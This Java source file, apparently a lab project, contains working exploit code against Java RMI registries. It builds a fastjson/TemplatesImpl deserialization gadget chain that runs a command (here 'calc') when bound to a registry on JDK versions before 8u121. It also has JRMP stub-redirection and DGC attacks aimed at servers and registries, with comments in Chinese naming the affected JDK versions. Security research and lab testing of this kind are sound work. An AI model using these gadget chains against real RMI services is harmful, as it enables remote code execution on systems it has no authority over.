package RMI;

import com.alibaba.fastjson.JSONArray;
import remoteObj.Hello;
import remoteObj.HelloImpl;
import remoteObj.HelloImpl2;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import tools.ClassByteGen;
import tools.InvocationHandlerImpl;
import tools.ReflectTools;
import tools.TemplatesGen;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.io.Serializable;
import java.lang.reflect.Proxy;
import java.net.ServerSocket;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.UnicastRemoteObject;
import java.util.Random;

public class Server {

    public static void main(String[] args) throws Exception {
        serverAttackRegistryWithBind();
    }

    // 正常绑定远程对象
    public static void bind() throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        registry.bind("HelloImpl", new HelloImpl());
    }


    // fastjson原生反序列化触发getter，bind实现server打registry，适用于<8u121
    public static void serverAttackRegistryWithBind() throws Exception {
        String code = "{\n" +
                "        Runtime.getRuntime().exec(\"calc\");\n" +
                "    }";
        byte[] bytes = ClassByteGen.getBytes(code, "AAAA");
        Templates templates = TemplatesGen.getTemplates(bytes, null);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException bad = new BadAttributeValueExpException("aaa");
        ReflectTools.setFieldValue(bad, "val", jsonArray);

        InvocationHandlerImpl invocationHandler = new InvocationHandlerImpl(bad);
        Remote o = (Remote) Proxy.newProxyInstance(invocationHandler.getClass().getClassLoader(), new Class[]{Remote.class}, invocationHandler);

        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        registry.bind("evil1", o);
    }

    // 将stub里的skel地址指向恶意JRMP服务，实现server打registry，<8u231
    public static void serverAttackRegistryWithJRMP() throws Exception {
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 13999);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(Server.class.getClassLoader(), new Class[] {
                Registry.class
        }, obj);

        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        registry.bind("evil25", proxy);
    }

    // gemini3给出的方法
    public static void aiServerAttackRegistryWithJRMP() throws Exception {
        // 1. 设置公网 IP（Stub 中的 Host）
        System.setProperty("java.rmi.server.hostname", "127.0.0.1");
        // 定义外部公网端口 (Stub 中的 Port，也是 Registry/DGC 尝试连接的端口)
        int dgcPort = 13999;
        // 定义内部真实端口 (Server 实际监听的端口)
        int serverPort = 13990;
        Hello hello = new HelloImpl2();
        Remote stub = UnicastRemoteObject.exportObject(hello, dgcPort, null, new Server.NatServerSocketFactory(serverPort));
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        registry.bind("HelloImpl", stub);
    }


    // 通过DGC JRMP实现registry打server
    public static void registerAttackServer() throws Exception {
        // java-chains启动恶意JRMP服务
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 13999);
        HelloImpl hello = new HelloImpl();
        registry.bind("evil3", hello);
    }

    static class NatServerSocketFactory implements RMIServerSocketFactory, Serializable {
        private int localRealPort;

        public NatServerSocketFactory(int localRealPort) {
            this.localRealPort = localRealPort;
        }

        @Override
        public ServerSocket createServerSocket(int port) throws IOException {
            // 【关键点】
            // RMI 传入的 port 参数是我们在 exportObject 时指定的“公网端口”(9000)
            // 但我们直接忽略它，强行绑定到“本地真实端口”(8000)
            System.out.println("RMI asked to bind to " + port + ", but actually binding to " + localRealPort);
            return new ServerSocket(localRealPort);
        }
    }

}
